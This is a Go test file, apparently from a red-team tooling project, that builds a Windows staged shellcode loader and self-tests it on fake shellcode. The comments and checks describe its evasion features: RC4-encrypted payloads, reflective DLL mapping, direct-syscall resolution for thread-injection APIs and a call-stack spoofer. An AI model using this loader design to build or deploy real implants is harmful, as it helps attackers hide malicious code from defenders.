//go:build windows && amd64

package modules

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"golang.org/x/sys/windows"
)

// stagedLoaderRequireTools skips the end-to-end build tests when the MinGW-w64
// toolchain is not on PATH. That is the case in the plain PowerShell CI step
// (no msys2 in PATH); the msys2 module-integration step has everything.
func stagedLoaderRequireTools(t *testing.T) {
	t.Helper()
	for _, tool := range []string{"bash", "x86_64-w64-mingw32-gcc", "cc", "nasm"} {
		if _, err := exec.LookPath(tool); err != nil {
			t.Skipf("skipping: %s not found in PATH", tool)
		}
	}
}

// stagedLoaderBuild runs build.sh with the given extra flags and fails the test
// on error. scPath/out are the required --shellcode/--output values.
func stagedLoaderBuild(t *testing.T, dir, scPath, out string, extra ...string) {
	t.Helper()
	args := append([]string{"./build.sh", "--shellcode", scPath, "--output", out, "--arch", "x64"}, extra...)
	cmd := exec.Command("bash", args...)
	cmd.Dir = dir
	if o, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("build.sh %v failed: %v\n%s", extra, err, o)
	}
}

// stagedLoaderSelfTest runs a built host with --selftest and parses the
// machine-readable SELFTEST line into a field map. extraEnv is appended to
// the inherited environment (used to toggle the relocation test hook).
func stagedLoaderSelfTest(t *testing.T, exe string, extraEnv ...string) map[string]string {
	t.Helper()
	cmd := exec.Command(exe, "--selftest")
	cmd.Env = append(os.Environ(), extraEnv...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("loader --selftest failed: %v\n%s", err, out)
	}
	var line string
	for _, l := range strings.Split(string(out), "\n") {
		if strings.HasPrefix(l, "SELFTEST ") {
			line = l
			break
		}
	}
	if line == "" {
		t.Fatalf("no SELFTEST line in output:\n%s", out)
	}
	fields := map[string]string{}
	for _, tok := range strings.Fields(line)[1:] {
		kv := strings.SplitN(tok, "=", 2)
		if len(kv) == 2 {
			fields[kv[0]] = kv[1]
		}
	}
	return fields
}

// checkStagedLoaderSelfTest asserts the staged decryption pipeline produced the
// expected payload and that the SSN table resolved. SilentMoonwalk is probed
// separately (opt-in) because its host-specific discovery can fault.
func checkStagedLoaderSelfTest(t *testing.T, fields map[string]string, plain []byte) {
	t.Helper()
	if fields["data_len"] != "200000" {
		t.Fatalf("data_len = %q, want 200000", fields["data_len"])
	}
	// The syscall table must resolve on x64 (regression lock for the Zw-twin
	// SSN ranking; `ssn=none` means NtQueueApcThread/NtCreateThreadEx would
	// fall back to the broken kernel32 path).
	if fields["ssn"] == "" || fields["ssn"] == "none" {
		t.Fatalf("syscall table did not resolve: ssn=%q", fields["ssn"])
	}
	if fields["key_len"] != "16" {
		t.Fatalf("key_len = %q, want 16", fields["key_len"])
	}
	if fields["head"] != hexPrefix(plain, 16) {
		t.Fatalf("head = %q, want %q", fields["head"], hexPrefix(plain, 16))
	}
	if fields["tail"] != hexSuffix(plain, 16) {
		t.Fatalf("tail = %q, want %q", fields["tail"], hexSuffix(plain, 16))
	}
}

// hexPrefix returns the hex of the first n bytes of b.
func hexPrefix(b []byte, n int) string {
	if len(b) < n {
		n = len(b)
	}
	return hex.EncodeToString(b[:n])
}

// hexSuffix returns the hex of the last n bytes of b.
func hexSuffix(b []byte, n int) string {
	if len(b) < n {
		n = len(b)
	}
	return hex.EncodeToString(b[len(b)-n:])
}

// stagedLoaderFixture writes deterministic fake shellcode and returns its path
// and contents. 200000 bytes is larger than one resource directory page, so
// section alignment/layout is exercised for real.
func stagedLoaderFixture(t *testing.T, dir string) (string, []byte) {
	t.Helper()
	plain := make([]byte, 200000)
	for i := range plain {
		plain[i] = byte((i*13 + 7) % 256)
	}
	path := filepath.Join(dir, "agent.exe.bin")
	if err := os.WriteFile(path, plain, 0o600); err != nil {
		t.Fatalf("write shellcode fixture: %v", err)
	}
	return path, plain
}

// checkStagedLoaderPE asserts a built artifact is an amd64 PE.
func checkStagedLoaderPE(t *testing.T, path string) {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	if !bytes.HasPrefix(data, []byte("MZ")) {
		t.Fatalf("%s is not a PE (missing MZ)", path)
	}
	peOff := binary.LittleEndian.Uint32(data[0x3c:])
	if int(peOff)+6 > len(data) {
		t.Fatalf("%s: truncated PE header", path)
	}
	if machine := binary.LittleEndian.Uint16(data[peOff+4:]); machine != 0x8664 {
		t.Fatalf("%s machine = 0x%x, want 0x8664 (amd64)", path, machine)
	}
}

// TestStagedLoaderBuildAndSelfTest drives the service build end to end: build.sh
// RC4-encrypts the shellcode blob and the stage DLL, embeds all four packed
// artifacts, and links the stager. Running `stager.exe --selftest` must
// reflectively map the stage, decrypt the blob and reproduce the original
// bytes (head/tail fingerprints). The run is repeated with
// STAGED_LOADER_FORCE_RELOC=1 and with --smw off to exercise the relocation and
// no-spoofer paths. Nothing is injected, so the test is safe in CI.
func TestStagedLoaderBuildAndSelfTest(t *testing.T) {
	stagedLoaderRequireTools(t)
	dir := stagedLoaderDir(t)
	tmp := t.TempDir()
	scPath, plain := stagedLoaderFixture(t, tmp)
	keyHex := "feedfacecafebeefdeadbeef01234567"

	outExe := filepath.Join(tmp, "staged_loader.exe")
	stagedLoaderBuild(t, dir, scPath, outExe, "--key", keyHex)
	checkStagedLoaderPE(t, outExe)

	checkStagedLoaderSelfTest(t, stagedLoaderSelfTest(t, outExe), plain)
	checkStagedLoaderSelfTest(t, stagedLoaderSelfTest(t, outExe, "STAGED_LOADER_FORCE_RELOC=1"), plain)

	// --smw off must build without the spoofer (and without nasm) and still
	// pass the staged selftest.
	noSmwExe := filepath.Join(tmp, "staged_loader_nosmw.exe")
	stagedLoaderBuild(t, dir, scPath, noSmwExe, "--key", keyHex, "--smw", "off")
	checkStagedLoaderSelfTest(t, stagedLoaderSelfTest(t, noSmwExe), plain)
}

// TestStagedLoaderExeAndDllFormats verifies the non-service exe and DLL hosts
// built from the same packed stage. The exe is checked with --selftest like
// the service build; the DLL's SelfTest export is called in-process (normal
// and forced-relocation) to prove the data-section embedding and reflective
// mapping work when the host is a DLL.
func TestStagedLoaderExeAndDllFormats(t *testing.T) {
	stagedLoaderRequireTools(t)
	dir := stagedLoaderDir(t)
	tmp := t.TempDir()
	scPath, plain := stagedLoaderFixture(t, tmp)
	keyHex := "feedfacecafebeefdeadbeef01234567"

	exePath := filepath.Join(tmp, "svc_noservice.exe")
	stagedLoaderBuild(t, dir, scPath, exePath, "--key", keyHex, "--format", "exe")
	checkStagedLoaderPE(t, exePath)
	checkStagedLoaderSelfTest(t, stagedLoaderSelfTest(t, exePath), plain)

	dllPath := filepath.Join(tmp, "staged_loader.dll")
	stagedLoaderBuild(t, dir, scPath, dllPath, "--key", keyHex, "--format", "dll")
	checkStagedLoaderPE(t, dllPath)

	dll, err := windows.LoadDLL(dllPath)
	if err != nil {
		t.Fatalf("LoadDLL(%s): %v", dllPath, err)
	}
	// Release before t.TempDir cleanup so the file is not still mapped.
	defer func() {
		if relErr := dll.Release(); relErr != nil {
			t.Logf("release %s: %v", dllPath, relErr)
		}
	}()

	if _, err := dll.FindProc("Run"); err != nil {
		t.Fatalf("DLL export Run not found: %v", err)
	}
	selfTestProc, err := dll.FindProc("SelfTest")
	if err != nil {
		t.Fatalf("DLL export SelfTest not found: %v", err)
	}
	if r, _, callErr := selfTestProc.Call(); r != 0 {
		t.Fatalf("DLL SelfTest returned %d (%v)", r, callErr)
	}
	// Exercise the relocation path inside the mapped DLL too.
	if err := os.Setenv("STAGED_LOADER_FORCE_RELOC", "1"); err != nil {
		t.Fatal(err)
	}
	defer os.Unsetenv("STAGED_LOADER_FORCE_RELOC")
	if r, _, callErr := selfTestProc.Call(); r != 0 {
		t.Fatalf("DLL SelfTest (forced reloc) returned %d (%v)", r, callErr)
	}
}
